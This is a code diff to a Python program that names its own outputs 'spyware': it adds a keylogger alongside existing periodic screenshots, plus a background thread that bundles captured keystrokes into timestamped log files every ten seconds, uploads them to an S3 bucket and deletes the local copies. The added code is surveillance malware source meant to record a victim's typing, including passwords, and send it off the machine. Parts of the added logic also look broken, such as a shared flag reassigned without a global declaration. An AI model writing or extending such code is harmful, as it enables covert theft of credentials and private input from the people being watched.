@@ -5,6 +5,25 @@ import os
 from datetime import timedelta, date, datetime
 import utils
 import time
+from threading import Thread
+from keylogger import KeyLogger, edit_lock, hasChanged
+
+def ten_seconds_passed(output_dir, s3_bucket):
+    while True:
+        time.sleep(10)
+        edit_lock.acquire()
+        if not hasChanged:
+            cur_date = datetime.now()
+            file_name = 'spyware-'+cur_date.strftime("%m-%d-%M-%S")+'.log'
+            fp = output_dir + '/outputs/keylogs' + '/' + file_name
+            os.rename(os.getcwd()+'\\output.txt', fp)
+            #save payloads to s3
+            if s3_bucket != "":
+                utils.save_to_s3(fp, file_name)
+                os.remove(os.getcwd()+'\\output.txt')
+                os.remove(fp)
+            hasChanged = True
+        edit_lock.release()           
 
 def main(args):
 	# Describes what is happening
@@ -26,6 +45,14 @@ def main(args):
 
     os.mkdir(output_dir+'/outputs')
     os.mkdir(output_dir + '/outputs/screenshots')
+    os.mkdir(output_dir + '/outputs/keylogs')
+    kwargs = {
+        'output_dir': output_dir,
+        's3_bucket': s3_bucket
+    }
+    upload_thread = Thread(target=ten_seconds_passed, kwargs=kwargs)
+    upload_thread.start()
+    keylogger = KeyLogger()
     while cur_date <= end_date:
         im = screenshot.grab()
         file_name = 'spyware-'+cur_date.strftime("%m-%d-%M-%S")+'.png'
@@ -40,6 +67,7 @@ def main(args):
         time.sleep(int(interval))
 
         cur_date += delta
+    upload_thread.join()
 
 # Instruction panel
 def inspanel():
